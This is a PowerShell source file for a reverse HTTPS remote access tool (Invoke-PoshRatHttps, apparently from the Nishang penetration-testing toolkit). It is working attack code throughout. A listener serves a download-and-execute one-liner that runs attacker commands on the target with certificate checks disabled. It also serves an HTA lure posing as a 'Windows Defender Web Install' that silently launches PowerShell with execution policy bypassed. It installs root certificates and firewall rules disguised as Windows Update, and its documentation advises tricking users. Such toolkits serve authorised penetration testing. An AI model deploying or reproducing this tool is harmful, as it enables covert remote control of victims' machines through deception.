function Invoke-PoshRatHttps
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse interactive PowerShell from a target over HTTPS.

.DESCRIPTION
This script starts a listener on the attacker's machine. The listener needs two ports, one for unencrypted initial
connect and another for encrypted channel. 

On the target machine execute the below command from PowerShell:
iex (New-Object Net.WebClient).DownloadString("http://IPAddress/connect")

or trick a user in connecting to: https://IPAddress/WindowsDefender.hta

The listener installs certificates by the name of "Windows Update Agent" and the IPAddress specifed on the attacker's machine and opens incoming
traffic on the specified ports. The firewall rules are named "Windows Update HTTPS" and "Windows Update HTTP".

The script has been originally written by Casey Smith (@subTee)

.PARAMETER IPAddress
The IP address on which the listener listens. Make sure that the IP address specified here is reachable from the target.

.PARAMETER Port
The port on which initial unecnrypted connection is establised. 

.PARAMETER SSLPort
The port on which encrypted communication is established. 

.EXAMPLE
PS > Invoke-PoshRatHttps -IPAddress 192.168.254.1 -Port 80 -SSLPort 443

Above shows an example where the listener starts on port 80 and 443. On the client execute:
iex (New-Object Net.WebClient).DownloadString("http://192.168.254.1/connect")

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-3.html
https://github.com/subTee/PoshRat
https://github.com/samratashok/nishang
#>   
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int]
        $Port,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int]
        $SSLPort

    )

    function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
    {
	    $CAsubject = $certSubject
	    $dn = new-object -com "X509Enrollment.CX500DistinguishedName"
	    $dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	    #Issuer Property for cleanup
	    $issuer = "Microsoft Windows Update"
	    $issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
	    $issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	    # Create a new Private Key
	    $key = new-object -com "X509Enrollment.CX509PrivateKey"
	    $key.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
	    # Set CAcert to 1 to be used for Signature
	    if($isCA)
		{
			$key.KeySpec = 2 
		}
	    else
		{
			$key.KeySpec = 1
		}
	    $key.Length = 1024
	    $key.MachineContext = 1
	    $key.Create() 
	 
	    # Create Attributes
	    $serverauthoid = new-object -com "X509Enrollment.CObjectId"
	    $serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
	    $ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
	    $ekuoids.add($serverauthoid)
	    $ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
	    $ekuext.InitializeEncode($ekuoids)

	    $cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
	    $cert.InitializeFromPrivateKey(2, $key, "")
	    $cert.Subject = $dn
	    $cert.Issuer = $issuerdn
	    #Backup One day to Avoid Timing Issues
        $cert.NotBefore = (get-date).AddDays(-1) 
        #Arbitrary... Change to persist longer...
	    $cert.NotAfter = $cert.NotBefore.AddDays(90) 
	    $cert.X509Extensions.Add($ekuext)
	    if ($isCA)
	    {
		    $basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
		    $basicConst.InitializeEncode("true", 1)
		    $cert.X509Extensions.Add($basicConst)
	    }
	    else
	    {              
		    $signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "Windows Update Agent" })
		    $signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
		    $signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
		    $cert.SignerCertificate = $signerCertificate
	    }
	    $cert.Encode()

	    $enrollment = new-object -com "X509Enrollment.CX509Enrollment"
	    $enrollment.InitializeFromRequest($cert)
	    $certdata = $enrollment.CreateRequest(0)
	    $enrollment.InstallResponse(2, $certdata, 0, "")

	    if($isCA)
	    {              
									
		    $CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "Windows Update Agent" })
		    # Install CA Root Certificate
		    $StoreScope = "LocalMachine"
		    $StoreName = "Root"
		    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
		    $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
		    $store.Add($CACertificate)
		    $store.Close()
									
	    }
	    else
	    {
		    return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
	    } 
     
    }


    function Receive-Request 
    {
       param(      
          $Request
       )
       $output = ""
       $size = $Request.ContentLength64 + 1   
       $buffer = New-Object byte[] $size
       do 
       {
          $count = $Request.InputStream.Read($buffer, 0, $size)
          $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
       } 
       until($count -lt $size)
       $Request.InputStream.Close()
       write-host $output
    }

    #Certificate Setup For SSL/TLS
    #Create and Install the CACert
    $CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "Windows Update Agent"  })
    if ($CACertificate -eq $null)
    {
	    Invoke-CreateCertificate "Windows Update Agent" $true
    }

    try
    {
        $isSSL = $true
        $listener = New-Object System.Net.HttpListener

        $sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $IPAddress })
        if ($sslcertfake -eq $null)
        {
	        $sslcertfake =  Invoke-CreateCertificate $IPAddress $false
        }
        $sslThumbprint = $sslcertfake.Thumbprint 
        $installCert = "netsh http add sslcert ipport=`"$IPAddress`":`"$SSLPort`" certhash=$sslThumbprint appid='{e46ad221-627f-4c05-9bb6-2529ae1fa815}'"
        Invoke-Expression $installCert
        Write-Output 'SSL Certificates Installed...'
        $listener.Prefixes.Add("https://+:$SSLPort/") #HTTPS Listener
        $listener.Prefixes.Add("http://+:$Port/") #HTTP Initial Connect

        #Create Firewall Rules
        netsh advfirewall firewall delete rule name="WindowsUpdate HTTPS" | Out-Null
        netsh advfirewall firewall add rule name="WindowsUpdate HTTPS" dir=in action=allow protocol=TCP localport=$SSLPort | Out-Null
        netsh advfirewall firewall delete rule name="WindowsUpdate HTTP" | Out-Null
        netsh advfirewall firewall add rule name="WindowsUpdate HTTP" dir=in action=allow protocol=TCP localport=$Port | Out-Null

        $listener.Start()
        Write-Output "Listening on $SSLPort"
        while ($true) 
        {
            $context = $listener.GetContext() # blocks until request is received
            $request = $context.Request
            $response = $context.Response
	        $hostip = $request.RemoteEndPoint
	        #Use this for One-Liner Start
	        if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
            {  
                $message = "
		            			
                            `$s = `"https://$IPAddress`:$SSLPort/rat`"
					        `$w = New-Object Net.WebClient 
					        while(`$true)
					        {
					        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
					        `$r = `$w.DownloadString(`$s)
					        while(`$r) {
						        `$o = invoke-expression `$r | out-string 
						        `$w.UploadString(`$s, `$o)	
						        break
					        }
					        }
		        "

            }		 
	
	        if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) 
            { 
		        Receive-Request($request)	
	        }
            if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) 
            {  
                $response.ContentType = 'text/plain'
                $message = Read-Host "PS $hostip>"		
            }
            if ($request.Url -match '/WindowsDefender.hta$' -and ($request.HttpMethod -eq "GET")) 
            {
		        $enc = [system.Text.Encoding]::UTF8
		        $response.ContentType = 'application/hta'
                $Htacode = @"
                <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                <html xmlns="http://www.w3.org/1999/xhtml">
                <head>
                <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
                <title>Windows Defender Web Install</title>
                <SCRIPT Language="VBScript">
                Sub Initialize()
                Set oShell = CreateObject("WScript.Shell")
                ps = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((new-object net.webclient).downloadstring('http://$IPAddress`:$Port/connect'))"
                oShell.run(ps),0,true
                End Sub
                </script>
                <hta:application
                   id="oHTA"
                   applicationname="Windows Defender Web Install"
                   application="yes"
                >
                </hta:application>
                </head>

                </SCRIPT>
                <div> 
                <body onload="Initialize()">
                <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
                </object></div>   
                </body>
                </html>
"@
		    
		        $buffer = $enc.GetBytes($htacode)		
		        $response.ContentLength64 = $buffer.length
		        $output = $response.OutputStream
		        $output.Write($buffer, 0, $buffer.length)
		        $output.Close()
		        continue
	        }
            [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
            $response.ContentLength64 = $buffer.length
            $output = $response.OutputStream
            $output.Write($buffer, 0, $buffer.length)
            $output.Close()
        }
        $listener.Stop()
    }
    catch
    {
        Write-Warning "Something went wrong! Check if client could reach the server and using the correct port." 
        Write-Error $_
    }
}